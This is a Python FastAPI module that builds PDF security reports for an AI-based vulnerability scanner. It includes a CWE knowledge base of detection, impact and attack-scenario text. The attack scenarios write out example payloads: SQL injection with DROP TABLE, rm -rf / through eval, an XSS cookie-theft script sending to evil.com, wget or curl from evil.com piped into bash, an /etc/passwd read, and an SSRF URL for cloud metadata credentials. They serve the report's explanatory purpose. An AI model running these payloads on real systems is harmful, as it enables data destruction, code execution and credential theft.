"""
PDF Report Generation for Vulnerability Scanner
Generates professional security assessment reports

Dependencies:
    pip install reportlab

Usage:
    POST /api/v1/report/pdf
    Body: { "scan_results": {...}, "metadata": {...} }
"""

from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
from typing import List, Dict, Optional
from datetime import datetime
from io import BytesIO
import logging

# PDF generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.platypus import (
        SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
        Image, PageBreak, ListFlowable, ListItem
    )
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False
    logging.warning("reportlab not installed. PDF export disabled. Install with: pip install reportlab")

router = APIRouter()
logger = logging.getLogger(__name__)


class VulnerabilityItem(BaseModel):
    cwe_id: str
    severity: str
    message: str
    line: int
    confidence: float = 0.0
    # Rich fields
    vulnerability_type: str = ""
    owasp_category: str = ""
    recommendation: str = ""
    secure_example: str = ""
    vulnerable_example: str = ""
    code_snippet: str = ""


class ReportMetadata(BaseModel):
    title: str = "Security Assessment Report"
    project_name: str = "Web Application"
    scan_date: str = ""
    scanned_by: str = "AI Vulnerability Scanner"
    language: str = "Python"


class PDFReportRequest(BaseModel):
    code: str
    vulnerabilities: List[VulnerabilityItem]
    metadata: Optional[ReportMetadata] = None
    risk_score: int = 0
    summary: str = ""


SEVERITY_BG = {
    'CRITICAL': colors.HexColor('#FED7D7'),
    'HIGH':     colors.HexColor('#FEEBC8'),
    'MEDIUM':   colors.HexColor('#FEFCBF'),
    'LOW':      colors.HexColor('#E2E8F0'),
    'INFO':     colors.HexColor('#EBF8FF'),
}
SEVERITY_FG = {
    'CRITICAL': colors.HexColor('#9B2C2C'),
    'HIGH':     colors.HexColor('#7B341E'),
    'MEDIUM':   colors.HexColor('#744210'),
    'LOW':      colors.HexColor('#2D3748'),
    'INFO':     colors.HexColor('#2C5282'),
}


def get_severity_color(severity: str):
    """Get foreground color for severity level"""
    return SEVERITY_FG.get(severity.upper(), colors.HexColor('#2D3748'))


def _escape(text: str) -> str:
    """Escape XML special characters for ReportLab Paragraphs."""
    return (text or '').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')


# ── CWE Knowledge Base ───────────────────────────────────────────────────────
# Provides rich explanations for each CWE: how it's detected, what's the impact,
# and a concrete attack scenario. Used in the PDF "Detailed Findings" section.
CWE_KNOWLEDGE_BASE: Dict[str, Dict[str, str]] = {
    'CWE-89': {
        'detection': 'The system detected SQL query construction using string concatenation or f-string formatting with user-controlled variables. The Pattern Matching Engine identified the concatenation pattern, and the GNN+Bi-LSTM model confirmed that user input flows directly into the SQL statement without parameterization.',
        'impact': 'An attacker can inject arbitrary SQL commands to read, modify, or delete data in the database. In severe cases, this can lead to full database compromise, unauthorized access to sensitive records (passwords, personal data), or even remote code execution on the database server.',
        'attack': 'Example: If the input is: \' OR 1=1 -- the query becomes: SELECT * FROM users WHERE name = \'\' OR 1=1 --\' which returns ALL records. An attacker could also use: \'; DROP TABLE users; -- to delete the entire table.',
    },
    'CWE-94': {
        'detection': 'The system detected the use of eval(), exec(), or similar dynamic code execution functions that accept external input. The Pattern Matching Engine flagged the dangerous function call, and the AI model analyzed the data flow to confirm that user-controlled data reaches the execution point.',
        'impact': 'An attacker can execute arbitrary code on the server with the same privileges as the application. This can lead to complete system compromise, data theft, installation of malware, or use of the server as a launchpad for further attacks.',
        'attack': 'Example: If user input is: __import__(\'os\').system(\'rm -rf /\') passed to eval(), it would execute a system command that deletes all files on the server.',
    },
    'CWE-79': {
        'detection': 'The system detected user input being inserted directly into HTML output via res.send(), template literals, or innerHTML without sanitization. The Pattern Engine matched the output pattern, and the AI model traced the data flow from input source to HTML rendering.',
        'impact': 'An attacker can inject malicious JavaScript that executes in victims\' browsers. This enables session hijacking (stealing cookies), defacing the website, redirecting users to phishing sites, or performing actions on behalf of logged-in users.',
        'attack': 'Example: If search query is: <script>document.location=\'http://evil.com/?c=\'+document.cookie</script> it would steal the victim\'s session cookie and send it to the attacker\'s server.',
    },
    'CWE-78': {
        'detection': 'The system detected OS command construction using string concatenation with user input, typically via os.system(), subprocess.call(shell=True), or child_process.exec(). The AI model confirmed that external input flows into the command string without sanitization.',
        'impact': 'An attacker can execute arbitrary operating system commands. This can lead to complete server takeover, data exfiltration, installation of backdoors, lateral movement within the network, or denial of service.',
        'attack': 'Example: If filename input is: file.txt; cat /etc/passwd the command becomes: tar -czf backup.tar.gz file.txt; cat /etc/passwd executing both commands and exposing system passwords.',
    },
    'CWE-77': {
        'detection': 'The system detected command injection patterns where user-controlled data is passed to system command execution functions. The Pattern Matching Engine identified dangerous function calls (os.system, subprocess with shell=True), and the AI model verified the tainted data flow.',
        'impact': 'An attacker can execute arbitrary operating system commands on the server. This can lead to complete server compromise, data theft, service disruption, or use of the server for malicious purposes such as cryptocurrency mining or botnet participation.',
        'attack': 'Example: If user input is: ; wget http://evil.com/malware.sh && bash malware.sh the attacker can download and execute malicious scripts on the server.',
    },
    'CWE-22': {
        'detection': 'The system detected file path construction using string concatenation with user-supplied values. The Pattern Engine identified patterns like open(f"/path/{user_input}") or path.join with unvalidated input. The AI model confirmed the absence of path normalization or directory restriction checks.',
        'impact': 'An attacker can read arbitrary files from the server, including configuration files with database credentials, application source code, or system files like /etc/passwd. In write scenarios, the attacker could overwrite critical system files.',
        'attack': 'Example: If path input is: ../../../../etc/passwd the application would read: /data/../../../../etc/passwd which resolves to /etc/passwd, exposing system user information.',
    },
    'CWE-502': {
        'detection': 'The system detected the use of unsafe deserialization functions such as pickle.loads(), yaml.load() without SafeLoader, or eval() on serialized data. The Pattern Engine flagged these dangerous function calls, and the AI model confirmed that the deserialized data originates from an untrusted source.',
        'impact': 'An attacker can craft malicious serialized objects that execute arbitrary code when deserialized. This can lead to Remote Code Execution (RCE), allowing complete server takeover without any authentication.',
        'attack': 'Example: A crafted pickle payload can execute: os.system("curl http://evil.com/shell.sh | bash") simply by being deserialized with pickle.loads(), giving the attacker full control of the server.',
    },
    'CWE-798': {
        'detection': 'The system detected hardcoded credentials, API keys, or secret tokens embedded directly in source code. The Pattern Engine matched patterns like AWS_ACCESS_KEY, password = "...", or API_KEY = "..." with high-entropy string values. The AI model confirmed these are not test/placeholder values.',
        'impact': 'If the source code is leaked or shared (e.g., pushed to a public GitHub repository), attackers can immediately use these credentials to access cloud services, databases, or APIs. This can lead to unauthorized data access, financial charges on cloud accounts, or service abuse.',
        'attack': 'Example: Exposed AWS credentials allow an attacker to run: aws s3 ls --profile stolen to list all S3 buckets and download sensitive data, or spin up expensive EC2 instances for cryptocurrency mining.',
    },
    'CWE-918': {
        'detection': 'The system detected HTTP request functions (fetch, requests.get, axios) with URLs constructed from user input. The Pattern Engine identified dynamic URL patterns, and the AI model traced the data flow to confirm that the URL is user-controlled without allowlist validation.',
        'impact': 'An attacker can make the server send requests to internal services, cloud metadata endpoints (169.254.169.254), or other systems behind the firewall. This can expose internal APIs, steal cloud credentials, or scan internal networks.',
        'attack': 'Example: If URL input is: http://169.254.169.254/latest/meta-data/iam/security-credentials/ the server would fetch and return AWS IAM credentials from the cloud metadata service.',
    },
}

# Fallback detection text for CWEs not in the knowledge base
CWE_FALLBACK = {
    'detection': 'The system detected a potentially dangerous code pattern using a combination of Pattern Matching (regex-based rules) and AI analysis (GNN + Bi-LSTM model). The Pattern Engine identified the suspicious code construct, and the AI model analyzed the code structure and data flow to assess vulnerability likelihood.',
    'impact': 'This vulnerability could allow attackers to compromise the security of the application. The specific impact depends on the vulnerability type and the application context. Refer to the CWE database (https://cwe.mitre.org) for detailed information.',
    'attack': 'Refer to the CWE ID listed above for specific attack scenarios and exploitation techniques.',
}


def generate_pdf_report(request: PDFReportRequest) -> BytesIO:
    """Generate a professional, detailed PDF security report."""

    buffer = BytesIO()
    doc = SimpleDocTemplate(
        buffer,
        pagesize=A4,
        rightMargin=45,
        leftMargin=45,
        topMargin=50,
        bottomMargin=50,
    )

    styles = getSampleStyleSheet()
    PAGE_W = A4[0] - 90  # usable width

    title_style = ParagraphStyle(
        'CustomTitle', parent=styles['Heading1'],
        fontSize=22, spaceAfter=6, alignment=TA_CENTER,
        textColor=colors.HexColor('#1a365d'),
    )
    subtitle_style = ParagraphStyle(
        'Subtitle', parent=styles['Normal'],
        fontSize=11, spaceAfter=20, alignment=TA_CENTER,
        textColor=colors.HexColor('#4a5568'),
    )
    heading_style = ParagraphStyle(
        'Heading', parent=styles['Heading2'],
        fontSize=14, spaceBefore=18, spaceAfter=8,
        textColor=colors.HexColor('#2c5282'),
        borderPad=4,
    )
    label_style = ParagraphStyle(
        'Label', parent=styles['Normal'],
        fontSize=9, textColor=colors.HexColor('#718096'),
    )
    body_style = ParagraphStyle(
        'Body', parent=styles['Normal'],
        fontSize=9, spaceAfter=6, leading=14,
    )
    code_style = ParagraphStyle(
        'Code', parent=styles['Normal'],
        fontSize=8, fontName='Courier', leading=12,
        backColor=colors.HexColor('#F7FAFC'),
        leftIndent=6, rightIndent=6,
        spaceAfter=4,
    )
    footer_style = ParagraphStyle(
        'Footer', parent=styles['Normal'],
        fontSize=7, textColor=colors.HexColor('#a0aec0'),
        alignment=TA_CENTER,
    )

    story = []
    metadata = request.metadata or ReportMetadata()

    # ── Cover ────────────────────────────────────────────────────────────────
    story.append(Spacer(1, 20))
    story.append(Paragraph("Security Assessment Report", title_style))
    story.append(Paragraph("AI-Based Vulnerability Scanner", subtitle_style))

    scan_date = metadata.scan_date or datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info_data = [
        ["Project",    metadata.project_name],
        ["Scan Date",  scan_date],
        ["Scanner",    metadata.scanned_by],
        ["Language",   metadata.language],
    ]
    info_tbl = Table(info_data, colWidths=[110, PAGE_W - 110])
    info_tbl.setStyle(TableStyle([
        ('FONTNAME',  (0, 0), (-1, -1), 'Helvetica'),
        ('FONTSIZE',  (0, 0), (-1, -1), 9),
        ('FONTNAME',  (0, 0), (0, -1),  'Helvetica-Bold'),
        ('TEXTCOLOR', (0, 0), (0, -1),  colors.HexColor('#4a5568')),
        ('VALIGN',    (0, 0), (-1, -1), 'MIDDLE'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
        ('TOPPADDING',    (0, 0), (-1, -1), 5),
        ('ROWBACKGROUNDS', (0, 0), (-1, -1), [colors.HexColor('#F7FAFC'), colors.white]),
    ]))
    story.append(info_tbl)
    story.append(Spacer(1, 18))

    # ── Executive Summary ────────────────────────────────────────────────────
    story.append(Paragraph("Executive Summary", heading_style))

    risk_score  = request.risk_score
    risk_level  = ("CRITICAL" if risk_score >= 75 else
                   "HIGH"     if risk_score >= 50 else
                   "MEDIUM"   if risk_score >= 25 else "LOW")
    risk_bg  = SEVERITY_BG.get(risk_level,  colors.HexColor('#E2E8F0'))
    risk_fg  = SEVERITY_FG.get(risk_level,  colors.HexColor('#2D3748'))

    risk_tbl = Table([[f"Risk Score:  {risk_score} / 100", f"Risk Level:  {risk_level}"]],
                     colWidths=[PAGE_W / 2, PAGE_W / 2])
    risk_tbl.setStyle(TableStyle([
        ('FONTNAME',  (0, 0), (-1, -1), 'Helvetica-Bold'),
        ('FONTSIZE',  (0, 0), (-1, -1), 13),
        ('TEXTCOLOR', (0, 0), (-1, -1), risk_fg),
        ('ALIGN',     (0, 0), (-1, -1), 'CENTER'),
        ('BACKGROUND',(0, 0), (-1, -1), risk_bg),
        ('BOX',       (0, 0), (-1, -1), 1, colors.HexColor('#e2e8f0')),
        ('TOPPADDING',    (0, 0), (-1, -1), 12),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
    ]))
    story.append(risk_tbl)
    story.append(Spacer(1, 10))

    if request.summary:
        story.append(Paragraph(_escape(request.summary), body_style))

    # ── Severity Statistics ──────────────────────────────────────────────────
    story.append(Paragraph("Vulnerability Statistics", heading_style))

    sev_counts: Dict[str, int] = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
    for v in request.vulnerabilities:
        sev_counts[v.severity.upper()] = sev_counts.get(v.severity.upper(), 0) + 1

    stats_data = [["Severity", "Count", "Visual"]]
    for sev in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'):
        cnt = sev_counts.get(sev, 0)
        bar = "█" * min(cnt, 20)
        stats_data.append([sev, str(cnt), bar])
    stats_data.append(["TOTAL", str(len(request.vulnerabilities)), ""])

    stats_tbl = Table(stats_data, colWidths=[90, 60, PAGE_W - 150])
    bg_rows = [SEVERITY_BG.get(r[0], colors.HexColor('#EDF2F7')) for r in stats_data[1:-1]]
    style_cmds = [
        ('FONTNAME',  (0, 0), (-1, 0),  'Helvetica-Bold'),
        ('FONTNAME',  (0, -1),(-1, -1), 'Helvetica-Bold'),
        ('BACKGROUND',(0, 0), (-1, 0),  colors.HexColor('#4a5568')),
        ('TEXTCOLOR', (0, 0), (-1, 0),  colors.white),
        ('BACKGROUND',(0, -1),(-1, -1), colors.HexColor('#E2E8F0')),
        ('ALIGN',     (1, 0), (1, -1),  'CENTER'),
        ('GRID',      (0, 0), (-1, -1), 0.4, colors.HexColor('#CBD5E0')),
        ('FONTSIZE',  (0, 0), (-1, -1), 9),
        ('TOPPADDING',    (0, 0), (-1, -1), 6),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
    ]
    for idx, bg in enumerate(bg_rows, start=1):
        style_cmds.append(('BACKGROUND', (0, idx), (0, idx), bg))
        style_cmds.append(('TEXTCOLOR',  (0, idx), (0, idx), SEVERITY_FG.get(stats_data[idx][0], colors.black)))
        style_cmds.append(('FONTNAME',   (0, idx), (0, idx), 'Helvetica-Bold'))
    stats_tbl.setStyle(TableStyle(style_cmds))
    story.append(stats_tbl)
    story.append(Spacer(1, 6))

    # ── Detailed Findings ────────────────────────────────────────────────────
    story.append(PageBreak())
    story.append(Paragraph("Detailed Findings", heading_style))

    if not request.vulnerabilities:
        story.append(Paragraph("✓ No vulnerabilities detected.", body_style))
    else:
        for i, vuln in enumerate(request.vulnerabilities, 1):
            sev_upper = vuln.severity.upper()
            sev_bg = SEVERITY_BG.get(sev_upper, colors.HexColor('#EDF2F7'))
            sev_fg = SEVERITY_FG.get(sev_upper, colors.HexColor('#2D3748'))

            vuln_type = vuln.vulnerability_type or vuln.cwe_id
            owasp_cat = vuln.owasp_category or "—"

            # ── Finding header bar ──
            hdr_tbl = Table(
                [[f"  #{i}  {sev_upper}", vuln_type]],
                colWidths=[90, PAGE_W - 90],
            )
            hdr_tbl.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (0, 0), sev_bg),
                ('BACKGROUND', (1, 0), (1, 0), colors.HexColor('#EBF4FF')),
                ('TEXTCOLOR',  (0, 0), (0, 0), sev_fg),
                ('TEXTCOLOR',  (1, 0), (1, 0), colors.HexColor('#2c5282')),
                ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
                ('FONTSIZE',   (0, 0), (-1, -1), 10),
                ('TOPPADDING',    (0, 0), (-1, -1), 8),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
                ('LEFTPADDING',   (0, 0), (-1, -1), 8),
                ('BOX',        (0, 0), (-1, -1), 0.5, colors.HexColor('#CBD5E0')),
            ]))
            story.append(hdr_tbl)

            # ── Meta row: CWE | OWASP | Line | Confidence ──
            meta_data = [
                ["CWE ID", "OWASP Category", "Line", "Confidence"],
                [vuln.cwe_id, owasp_cat, str(vuln.line), f"{vuln.confidence:.0%}"],
            ]
            meta_tbl = Table(meta_data, colWidths=[70, PAGE_W - 200, 50, 70])
            meta_tbl.setStyle(TableStyle([
                ('FONTNAME',  (0, 0), (-1, 0),  'Helvetica-Bold'),
                ('FONTNAME',  (0, 1), (-1, 1),  'Helvetica'),
                ('FONTSIZE',  (0, 0), (-1, -1), 8),
                ('BACKGROUND',(0, 0), (-1, 0),  colors.HexColor('#EDF2F7')),
                ('BACKGROUND',(0, 1), (-1, 1),  colors.white),
                ('GRID',      (0, 0), (-1, -1), 0.4, colors.HexColor('#CBD5E0')),
                ('ALIGN',     (2, 0), (-1, -1), 'CENTER'),
                ('TOPPADDING',    (0, 0), (-1, -1), 5),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
                ('LEFTPADDING',   (0, 0), (-1, -1), 6),
            ]))
            story.append(meta_tbl)

            # ── Description ──
            story.append(Spacer(1, 4))
            story.append(Paragraph(
                f"<b>Description:</b> {_escape(vuln.message)}",
                body_style,
            ))

            # ── How was this detected? (Detection Methodology) ──
            cwe_key = vuln.cwe_id.upper() if vuln.cwe_id else ''
            knowledge = CWE_KNOWLEDGE_BASE.get(cwe_key, CWE_FALLBACK)

            story.append(Spacer(1, 4))
            detect_tbl = Table(
                [["How was this detected?"]],
                colWidths=[PAGE_W],
            )
            detect_tbl.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#EBF8FF')),
                ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#2C5282')),
                ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
                ('FONTSIZE',   (0, 0), (-1, -1), 9),
                ('TOPPADDING',    (0, 0), (-1, -1), 6),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
                ('LEFTPADDING',   (0, 0), (-1, -1), 8),
                ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#BEE3F8')),
            ]))
            story.append(detect_tbl)
            story.append(Paragraph(_escape(knowledge['detection']), body_style))

            # ── Impact & Risk ──
            story.append(Spacer(1, 4))
            impact_tbl = Table(
                [["Impact & Risk"]],
                colWidths=[PAGE_W],
            )
            impact_tbl.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#FFF5F5')),
                ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#9B2C2C')),
                ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
                ('FONTSIZE',   (0, 0), (-1, -1), 9),
                ('TOPPADDING',    (0, 0), (-1, -1), 6),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
                ('LEFTPADDING',   (0, 0), (-1, -1), 8),
                ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#FED7D7')),
            ]))
            story.append(impact_tbl)
            story.append(Paragraph(_escape(knowledge['impact']), body_style))

            # ── Attack Scenario ──
            story.append(Spacer(1, 4))
            attack_tbl = Table(
                [["Attack Scenario"]],
                colWidths=[PAGE_W],
            )
            attack_tbl.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#FEFCBF')),
                ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#744210')),
                ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
                ('FONTSIZE',   (0, 0), (-1, -1), 9),
                ('TOPPADDING',    (0, 0), (-1, -1), 6),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
                ('LEFTPADDING',   (0, 0), (-1, -1), 8),
                ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#FEFCBF')),
            ]))
            story.append(attack_tbl)
            story.append(Paragraph(_escape(knowledge['attack']), body_style))

            # ── Code snippet at vulnerable line ──
            if vuln.code_snippet:
                story.append(Paragraph(
                    f"<b>Vulnerable code at line {vuln.line}:</b>",
                    label_style,
                ))
                snippet_lines = vuln.code_snippet.split('\n')
                formatted = '\n'.join(
                    f"{_escape(ln)}" for ln in snippet_lines
                )
                story.append(Paragraph(formatted, code_style))

            # ── Vulnerable example ──
            if vuln.vulnerable_example:
                story.append(Paragraph("<b>Example of vulnerable code:</b>", label_style))
                vex_lines = '\n'.join(_escape(ln) for ln in vuln.vulnerable_example.split('\n'))
                story.append(Paragraph(vex_lines, code_style))

            # ── Recommendation / secure example ──
            if vuln.recommendation:
                story.append(Spacer(1, 4))
                rec_tbl = Table(
                    [["Recommendation"]],
                    colWidths=[PAGE_W],
                )
                rec_tbl.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#F0FFF4')),
                    ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#276749')),
                    ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
                    ('FONTSIZE',   (0, 0), (-1, -1), 9),
                    ('TOPPADDING',    (0, 0), (-1, -1), 6),
                    ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
                    ('LEFTPADDING',   (0, 0), (-1, -1), 8),
                    ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#C6F6D5')),
                ]))
                story.append(rec_tbl)
                story.append(Paragraph(_escape(vuln.recommendation), body_style))
            if vuln.secure_example:
                story.append(Paragraph("<b>Secure code example:</b>", label_style))
                sec_lines = '\n'.join(_escape(ln) for ln in vuln.secure_example.split('\n'))
                story.append(Paragraph(sec_lines, code_style))

            story.append(Spacer(1, 14))

    # ── Scanned Code (full, with line numbers) ──────────────────────────────
    story.append(PageBreak())
    story.append(Paragraph("Scanned Code", heading_style))

    all_lines  = request.code.split('\n')
    vuln_lines = {v.line for v in request.vulnerabilities}

    # Build a table: line number | code line
    code_rows = []
    for idx, line_text in enumerate(all_lines[:200], start=1):
        ln_str   = str(idx)
        code_str = _escape(line_text)
        row_bg   = colors.HexColor('#FFF5F5') if idx in vuln_lines else colors.white
        code_rows.append((ln_str, code_str, row_bg))

    # Render as table so we can colour rows
    tbl_data   = [["#", "Code"]] + [[r[0], r[1]] for r in code_rows]
    col_widths = [28, PAGE_W - 28]
    code_tbl   = Table(tbl_data, colWidths=col_widths, repeatRows=1)

    code_style_cmds = [
        ('FONTNAME',  (0, 0), (-1, -1), 'Courier'),
        ('FONTSIZE',  (0, 0), (-1, -1), 7),
        ('FONTNAME',  (0, 0), (-1, 0),  'Helvetica-Bold'),
        ('FONTSIZE',  (0, 0), (-1, 0),  8),
        ('BACKGROUND',(0, 0), (-1, 0),  colors.HexColor('#4a5568')),
        ('TEXTCOLOR', (0, 0), (-1, 0),  colors.white),
        ('GRID',      (0, 0), (-1, -1), 0.3, colors.HexColor('#E2E8F0')),
        ('TOPPADDING',    (0, 0), (-1, -1), 2),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 2),
        ('LEFTPADDING',   (1, 0), (1, -1), 6),
        ('ALIGN',     (0, 0), (0, -1),  'RIGHT'),
        ('TEXTCOLOR', (0, 1), (0, -1),  colors.HexColor('#A0AEC0')),
    ]
    for row_idx, (_, _, row_bg) in enumerate(code_rows, start=1):
        if row_bg != colors.white:
            code_style_cmds.append(('BACKGROUND', (0, row_idx), (-1, row_idx), row_bg))
    code_tbl.setStyle(TableStyle(code_style_cmds))
    story.append(code_tbl)

    if len(all_lines) > 200:
        story.append(Paragraph("<i>… code truncated at 200 lines</i>", body_style))

    # ── Footer ───────────────────────────────────────────────────────────────
    story.append(Spacer(1, 20))
    story.append(Paragraph(
        f"Generated by AI Vulnerability Scanner  |  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        footer_style,
    ))

    doc.build(story)
    buffer.seek(0)
    return buffer


@router.post("/report/pdf", tags=["Reports"])
async def generate_pdf(request: PDFReportRequest):
    """
    **Generate PDF Security Report**
    
    Creates a professional PDF report with:
    - Executive Summary with Risk Score
    - Vulnerability Statistics by Severity
    - Detailed Findings with CWE IDs
    - Scanned Code (first 50 lines)
    
    Returns a downloadable PDF file.
    """
    if not REPORTLAB_AVAILABLE:
        raise HTTPException(
            status_code=503,
            detail="PDF generation not available. Install reportlab: pip install reportlab"
        )
    
    try:
        # --- Add logging for console visibility ---
        project_name = request.metadata.project_name if request.metadata else "Web Application"
        print(f"\n[REPORT ENGINE] Starting PDF Report Generation...")
        print(f"[REPORT ENGINE] Processing {len(request.vulnerabilities)} vulnerabilities for project '{project_name}'")
        print(f"[REPORT ENGINE] Calculating Risk Metrics... (Score: {request.risk_score}/100)")
        
        pdf_buffer = generate_pdf_report(request)
        
        # Generate filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"security_report_{timestamp}.pdf"
        
        print(f"[REPORT ENGINE] Rendering pages and formatting layout...")
        print(f"[REPORT ENGINE] PDF successfully generated: {filename}")
        print(f"[REPORT ENGINE] Exporting report data stream to client...\n")
        
        return StreamingResponse(
            pdf_buffer,
            media_type="application/pdf",
            headers={
                "Content-Disposition": f"attachment; filename={filename}"
            }
        )
        
    except Exception as e:
        logger.error(f"PDF generation failed: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"PDF generation failed: {str(e)}")


@router.get("/report/pdf/status", tags=["Reports"])
async def pdf_status():
    """Check if PDF generation is available"""
    return {
        "available": REPORTLAB_AVAILABLE,
        "message": "PDF generation ready" if REPORTLAB_AVAILABLE else "Install reportlab: pip install reportlab"
    }
